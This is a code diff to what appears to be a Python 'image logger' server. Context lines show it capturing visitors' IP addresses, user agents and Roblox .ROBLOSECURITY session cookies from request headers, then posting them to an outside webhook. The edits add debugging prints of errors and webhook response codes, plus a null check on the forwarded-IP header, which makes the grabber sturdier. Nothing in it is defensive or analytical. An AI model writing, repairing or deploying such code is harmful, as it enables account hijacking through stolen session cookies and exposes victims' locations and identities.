@@ -36,6 +36,7 @@ def botCheck(ip, useragent):
         return False
 
 def reportError(error):
+    print(f"Reporting error: {error}")  # Add this for debugging
     requests.post(config["webhook"], json={
         "username": config["username"],
         "content": "@everyone",
@@ -127,7 +128,8 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, roblo
 
     if url:
         embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json=embed)
+    response = requests.post(config["webhook"], json=embed)
+    print(f"Report response status: {response.status_code}")  # Add this for debugging
     return info
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
@@ -146,7 +148,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
 
             roblosecurity_cookie = get_roblosecurity_cookie(self.headers)  # Obtén la cookie
 
-            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
+            if self.headers.get('x-forwarded-for') and self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
             
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
@@ -212,7 +214,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             self.send_header('Content-type', 'text/html')
             self.end_headers()
             reportError(traceback.format_exc())
-            print(traceback.format_exc())
+            print(f"Exception occurred: {traceback.format_exc()}")  # Add this for debugging
             pass
 
     def do_GET(self):
